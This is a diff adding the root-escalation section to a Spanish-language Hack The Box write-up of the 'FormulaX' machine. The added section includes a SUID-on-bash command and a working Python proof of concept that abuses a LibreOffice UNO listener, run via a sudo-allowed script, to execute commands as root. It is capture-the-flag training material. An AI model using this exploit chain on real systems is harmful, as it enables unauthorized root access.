@@ -289,6 +289,11 @@ Vamos tenemos las credenciales del usuario kai!
 ![](../assets/images/htb-writeup-formulax/libre4.PNG)
 
 Si nos autentificamos con kai podemos ver que puede ejecutar un script como sudo:
+
+**ROOT FLAG**
+
+El script lo que hace es ponerse en escucha por el puerto 2002, utilizaremos esto para nuesto favor.
+
 ```ruby
 kai_relay@formulax:~$ sudo -l
 Matching Defaults entries for kai_relay on forumlax:
@@ -299,4 +304,57 @@ User kai_relay may run the following commands on forumlax:
     (ALL) NOPASSWD: /usr/bin/office.sh
 kai_relay@formulax:~$ 
 ```
+
+```kai_relay@formulax:~$ echo 'chmod u+s /bin/bash' > /dev/shm/script.sh```
+
+Necesitamos 2 terminales.
+
+```kai_relay@formulax:~$ sudo  /usr/bin/office.sh```
+
+```
+kai_relay@formulax:~$ python3 p.py --host 127.0.0.1 --port 2002
+[+] Connecting to target...
+[+] Connected to 127.0.0.1
+kai_relay@formulax:~$ bash -p
+bash-5.1# whoami
+root
+```
+
+
+**POC**
+
+```py
+import uno
+import argparse
+
+parser = argparse.ArgumentParser()
+parser.add_argument('--host', help='host to connect to', dest='host', required=True)
+parser.add_argument('--port', help='port to connect to', dest='port', required=True)
+args = parser.parse_args()
+
+# Define the UNO component
+localContext = uno.getComponentContext()
+
+# Define the resolver to use, this is used to connect with the API
+resolver = localContext.ServiceManager.createInstanceWithContext(
+    "com.sun.star.bridge.UnoUrlResolver", localContext
+)
+
+# Connect with the provided host on the provided target port
+print("[+] Connecting to target...")
+context = resolver.resolve(
+    "uno:socket,host={0},port={1};urp;StarOffice.ComponentContext".format(args.host, args.port)
+)
+
+# Issue the service manager to spawn the SystemShellExecute module and execute the reverse shell
+service_manager = context.ServiceManager
+print("[+] Connected to {0}".format(args.host))
+shell_execute = service_manager.createInstance("com.sun.star.system.SystemShellExecute")
+shell_execute.execute(
+    "/bin/bash",
+    ('/dev/shm/script.sh'),
+    0  # Flags: 0 means normal execution, 1 means hidden
+)
+```
+
 
